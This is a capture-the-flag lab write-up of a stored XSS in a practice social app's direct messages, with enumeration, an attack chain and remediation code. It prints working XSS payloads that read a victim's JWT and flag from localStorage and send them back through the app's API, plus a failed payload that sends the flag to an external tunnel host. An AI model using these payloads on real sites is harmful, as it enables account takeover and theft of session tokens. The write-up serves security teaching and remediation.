---
layout: default
title: "Ottergram (Stored XSS — DM localStorage Exfil) - BugForge"
---

[← Back](./)

# BugForge - Ottergram Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-27</span>
  <span><strong>Difficulty:</strong> Easy</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Stored XSS via Direct Message content — unsanitized HTML rendered with `dangerouslySetInnerHTML` (CWE-79)
2. Sensitive data in localStorage accessible to XSS (CWE-922)
3. Wildcard CORS configuration (CWE-942)

**Business Impact:** Any authenticated user can execute arbitrary JavaScript in any other user's browser via DM, enabling full account takeover, session hijacking, and data exfiltration.

---

## Objective
Find the flag hidden within the Ottergram application — an Instagram-like social media platform for otter enthusiasts.

## Initial Access
```bash
# Target Application
URL: https://lab-1774652179703-chxke1.labs-app.bugforge.io

# Credentials
Registered users: haxor / haxor2 / haxor3
Auth: JWT (HS256) via POST /api/register, stored in localStorage
JWT payload: {id, username, iat} — no role claim, role is DB-driven
```

## Key Findings
### Critical & High-Risk Vulnerabilities
1. **Stored XSS via Direct Message content** (CWE-79: Improper Neutralization of Input During Web Page Generation) — The POST /api/messages `content` field accepts arbitrary HTML. The React frontend renders inbox messages using `dangerouslySetInnerHTML: {__html: e.content}` with zero sanitization on either the server (storage) or client (rendering) side.

**CVSS v3.1 Score for Stored XSS:** **9.6 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | Required |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Enumeration Summary
### Application Analysis
**Target Endpoints Discovered:**

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| /api/register | POST | No | Field-filtered (role not accepted) |
| /api/verify-token | GET | Bearer | Returns full user obj with role |
| /api/profile/:username | GET | Bearer | Public profile |
| /api/profile | PUT | Bearer | {full_name, bio} — field-filtered |
| /api/posts | GET/POST | Bearer | Feed + create (multipart w/ image) |
| /api/messages | POST | Bearer | {recipient_id, content} — NO SANITIZE |
| /api/messages/inbox | GET | Bearer | DMs — renders with dangerouslySetInnerHTML |
| /api/admin | GET | Bearer | Admin panel — server-side role check |
| /api/admin/users | GET | Bearer | Has ?search= param |
| /api/admin/posts | GET | Bearer | Has ?search= param |

**Tech Stack:** React SPA frontend, Express.js backend, JWT (HS256) auth, Socket.IO real-time notifications, wildcard CORS.

## Attack Chain Visualization
```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│ Register user   │────▶│ Obtain valid JWT │────▶│  Discover flag in   │
│ POST /api/      │     │ from response    │     │  JS bundle:         │
│ register        │     │                  │     │  localStorage.flag  │
└─────────────────┘     └──────────────────┘     └──────────┬──────────┘
                                                            │
                                                            ▼
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│ DM to admin     │────▶│ Admin opens      │────▶│  dangerouslySet     │
│ (id=2) with     │     │ inbox via        │     │  InnerHTML renders  │
│ XSS in content  │     │ Socket.IO notify │     │  payload as HTML    │
└─────────────────┘     └──────────────────┘     └──────────┬──────────┘
                                                            │
                                                            ▼
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│ Read flag from  │◀────│ Admin's browser  │◀────│  JS reads           │
│ attacker inbox  │     │ POSTs flag back  │     │  localStorage.flag  │
│ (sent by admin) │     │ as DM to attacker│     │  + localStorage.    │
│                 │     │ using admin's JWT│     │  token              │
└─────────────────┘     └──────────────────┘     └─────────────────────┘
```

**Attack Path Summary:**
1. Register user and obtain valid JWT
2. Analyze JS bundle — discover `dangerouslySetInnerHTML` sink and flag in `localStorage("flag")`
3. Confirm external exfil seems to be blocked (sandboxed lab environment?)
4. Craft self-contained XSS payload that reads admin's localStorage and POSTs flag back via the app's own messaging API
5. Send payload as DM to admin (id=2)
6. Admin bot receives Socket.IO notification, opens inbox, payload executes
7. Retrieve flag from attacker's inbox (sent by admin's browser)

---

## Exploitation Path

### Step 1: Reconnaissance — Map the API Surface and Identify Sinks
Intercepted HTTP traffic via Caido and extracted routes from the React JS bundle (`/static/js/main.dd5901b1.js`). Key discoveries:

1. **DM rendering sink:** Inbox component uses `dangerouslySetInnerHTML: {__html: e.content}` to render message content — a classic XSS sink.
2. **Flag location:** JS bundle contains `if(s&&"admin"===s.role){const e=localStorage.getItem("flag");...}` — the flag is stored in the admin user's `localStorage("flag")`.
3. **Admin bot behavior:** Socket.IO `new-message` events trigger the admin to open their inbox, meaning any DM to admin will be rendered.

```
Key endpoints mapped:
  POST /api/messages       — send DM {recipient_id, content}
  GET  /api/messages/inbox — view received messages
  GET  /api/verify-token   — returns user object with role
  GET  /api/admin/*        — admin panel (server-side role check)
```

### Step 2: Eliminate Dead Ends — Mass Assignment and External Exfil
Before testing XSS, checked if there was a simpler path to admin:

- **Mass assignment on `/api/register`** with `role: "admin"` — server filtered the field, returned `role: "user"`
- **Mass assignment on `PUT /api/profile`** with `role: "admin"` — returned 200 but `/api/verify-token` still showed `role: "user"`
- **External exfiltration** via CloudFlare tunnel — payload fired but no callback received. The lab bot may not be able to reach external URLs.

This confirmed: no shortcut to admin, and data exfiltration needs to use the app's own API endpoints.

### Step 3: Craft Self-Contained XSS Payload
Since external exfil didn't work, the payload needed to:
1. Read `localStorage("flag")` and `localStorage("token")` from the admin's browser
2. Use the admin's own JWT to POST the flag back to the attacker as a DM via `/api/messages`

```html
<img src=x onerror="var t=localStorage.getItem('token');var f=localStorage.getItem('flag')||'no-flag';fetch('/api/messages',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({recipient_id:5,content:f})})">
```

**How it works:**
- `<img src=x>` triggers `onerror` because `x` is not a valid image
- `onerror` handler reads the admin's JWT and flag from localStorage
- Uses `fetch()` to POST the flag as a DM to the attacker (user id=5)
- Entirely self-contained — no external callbacks needed

### Step 4: Deliver Payload and Retrieve Flag
Sent the XSS payload as a DM to admin (user id=2):

```http
POST /api/messages HTTP/1.1
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"recipient_id":2,"content":"<img src=x onerror=\"var t=localStorage.getItem('token');var f=localStorage.getItem('flag')||'no-flag';fetch('/api/messages',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({recipient_id:5,content:f})})\">"}
```

The admin bot received the Socket.IO `new-message` notification, opened its inbox, and `dangerouslySetInnerHTML` rendered the payload. The admin's browser executed the JavaScript, read the flag from localStorage, and POSTed it back as a DM.

Checked attacker's inbox — message from admin (sender_id=2) containing the flag:

```json
{"id":14,"sender_id":2,"recipient_id":5,"content":"bug{XkGWX1AeLZxcWuM9iB4OankQ0Rtxns0b}","is_read":0,"created_at":"2026-03-27 23:19:26","sender_username":"admin"}
```

---

## Flag / Objective Achieved

✅ **Flag captured:** `bug{XkGWX1AeLZxcWuM9iB4OankQ0Rtxns0b}`

Exfiltrated from admin's `localStorage("flag")` via stored XSS in the DM system.

---

## Key Learnings
- **`dangerouslySetInnerHTML` is exactly as dangerous as the name implies.** React's default behavior escapes HTML in JSX expressions. The explicit opt-in to raw HTML rendering must always be paired with server-side sanitization or a client-side library like DOMPurify.
- **When external exfil is blocked, use the application against itself.** The admin bot couldn't reach external URLs, so the payload used the app's own messaging API to send the flag back. The victim's own authenticated session becomes the exfiltration channel.
- **JS bundles reveal both sinks and secrets.** The bundle exposed both the `dangerouslySetInnerHTML` sink and the fact that the flag was in `localStorage("flag")` — the full attack chain was discoverable from source review alone.
- **Socket.IO notifications create reliable trigger mechanisms.** The `new-message` event ensured the admin would open the inbox and render the payload without any social engineering or timing dependency.

---

## Tools Used
- **Caido** - HTTP traffic interception and API mapping
- **Browser DevTools** - JS bundle analysis — found dangerouslySetInnerHTML sink and flag location
- **curl / Caido Replay** - Payload delivery and inbox verification

---

## Remediation

### 1. Stored XSS via Direct Messages — Missing Input Sanitization (CVSS: 9.6 - Critical)
**Issue:** The DM `content` field is stored as-is (no sanitization) and rendered using `dangerouslySetInnerHTML` (no escaping). Any authenticated user can execute arbitrary JavaScript in any other user's browser by sending a crafted message.

**CWE Reference:** CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**Fix (Server-side — sanitize before storage):**
```javascript
// BEFORE (Vulnerable)
app.post('/api/messages', auth, async (req, res) => {
  const { recipient_id, content } = req.body;
  await db.run(
    'INSERT INTO messages (sender_id, recipient_id, content) VALUES (?, ?, ?)',
    [req.user.id, recipient_id, content]
  );
});

// AFTER (Secure — strip all HTML tags)
const sanitizeHtml = require('sanitize-html');

app.post('/api/messages', auth, async (req, res) => {
  const { recipient_id, content } = req.body;
  const cleanContent = sanitizeHtml(content, { allowedTags: [], allowedAttributes: {} });
  await db.run(
    'INSERT INTO messages (sender_id, recipient_id, content) VALUES (?, ?, ?)',
    [req.user.id, recipient_id, cleanContent]
  );
});
```

**Fix (Client-side — stop using dangerouslySetInnerHTML):**
```jsx
// BEFORE (Vulnerable)
<div dangerouslySetInnerHTML={% raw %}{{__html: message.content}}{% endraw %} />

// AFTER (Secure — React auto-escapes text content)
<div>{message.content}</div>
```

### 2. Sensitive Data in localStorage (CVSS: 4.3 - Medium)
**Issue:** The admin's flag and JWT are stored in `localStorage`, which is accessible to any JavaScript running on the page. Combined with XSS, this enables immediate exfiltration.

**CWE Reference:** CWE-922 — Insecure Storage of Sensitive Information

**Fix:**
- Store session tokens in httpOnly cookies (inaccessible to JavaScript)
- Never store secrets/flags in client-side storage
- Use SameSite=Strict and Secure cookie flags

### 3. Wildcard CORS Configuration (CVSS: 5.3 - Medium)
**Issue:** `Access-Control-Allow-Origin: *` allows any origin to make authenticated cross-origin requests.

**CWE Reference:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains

**Fix:**
```javascript
// BEFORE (Vulnerable)
app.use(cors());  // defaults to Access-Control-Allow-Origin: *

// AFTER (Secure)
app.use(cors({
  origin: 'https://your-app-domain.com',
  credentials: true
}));
```

---

## Failed Attempts

### Approach 1: Mass Assignment on Registration
```http
POST /api/register
{"username":"haxor","email":"h@x.com","password":"pass","full_name":"Haxor","role":"admin"}
```
**Result:** Failed — server filters extra fields, returned `role: "user"`

### Approach 2: Mass Assignment on Profile Update
```http
PUT /api/profile
{"full_name":"Haxor","bio":"test","role":"admin"}
```
**Result:** Failed — returned 200 OK but `/api/verify-token` still showed `role: "user"` (field silently ignored)

### Approach 3: External Exfiltration via CloudFlare Tunnel
```html
<img src=x onerror="fetch('https://external-tunnel.trycloudflare.com/exfil?d='+localStorage.getItem('flag'))">
```
**Result:** Failed — payload executed but no callback received. Lab bot cannot reach external URLs (sandboxed environment).

---

## OWASP Top 10 Coverage
- **A03:2021 — Injection** — Primary finding. Unsanitized user input in DM content rendered as HTML in victim's browser, enabling stored XSS.
- **A07:2021 — Identification and Authentication Failures** — JWT and sensitive data stored in localStorage rather than httpOnly cookies, enabling client-side exfiltration.
- **A05:2021 — Security Misconfiguration** — Wildcard CORS policy (`Access-Control-Allow-Origin: *`) widens the attack surface for cross-origin attacks.

---

## References
**XSS Resources:**
- [OWASP Testing Guide — Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [React — dangerouslySetInnerHTML Documentation](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

---

**Tags:** `#xss` `#stored-xss` `#dangerouslysetinnerhtml` `#localstorage-exfil` `#react` `#bugforge` `#dm-injection`
